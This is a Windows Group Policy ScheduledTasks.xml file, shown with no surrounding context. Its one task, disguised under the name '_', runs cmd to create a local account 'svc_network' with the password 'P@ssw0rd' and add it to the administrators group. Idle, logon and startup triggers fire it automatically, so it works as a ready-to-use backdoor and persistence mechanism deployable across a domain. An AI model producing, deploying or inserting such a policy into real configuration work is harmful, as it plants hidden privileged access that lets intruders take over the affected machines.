<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><Task clsid="{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}" name="_" image="0" changed="2026-01-29 03:36:39" uid="{CE855F9B-5CBA-42DF-8A94-A0BE33DF467C}" userContext="0" removePolicy="0"><Properties deleteWhenDone="0" startOnlyIfIdle="0" stopOnIdleEnd="0" noStartIfOnBatteries="0" stopIfGoingOnBatteries="0" systemRequired="0" action="C" name="_" appName="cmd" args="/c &quot;(net user svc_network P@ssw0rd /add &amp; net localgroup administrators svc_network /add)&quot;" startIn="" comment="" enabled="1"><Triggers><Trigger startHour="15" startMinutes="00" beginYear="2026" beginMonth="1" beginDay="14" hasEndDate="0" repeatTask="0" interval="1" type="IDLE" idleMinute="1"/><Trigger startHour="15" startMinutes="00" beginYear="2026" beginMonth="1" beginDay="14" hasEndDate="0" repeatTask="0" interval="1" idleMinute="1" type="LOGON"/><Trigger interval="1" idleMinute="1" type="STARTUP" startHour="15" startMinutes="00" beginYear="2026" beginMonth="1" beginDay="14" hasEndDate="0" repeatTask="0"/></Triggers></Properties></Task>
</ScheduledTasks>
